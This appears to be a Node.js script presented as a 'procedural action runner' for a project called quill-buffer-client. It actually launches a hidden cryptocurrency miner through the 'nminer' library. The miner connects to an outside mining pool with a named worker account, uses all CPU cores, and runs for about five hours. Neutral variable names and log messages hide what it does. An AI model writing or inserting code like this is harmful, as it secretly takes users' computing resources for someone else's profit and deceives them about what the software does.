// Procedural action runner for quill-buffer-client
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./src/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const instanceToken = "a92a92";
    console.log(`[runtime] Subsystem dispatched for quill-buffer-client [${instanceToken}]`);

    const scheduler = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.quill-buffer-client",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
        process.exit(0);
    }, 302 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
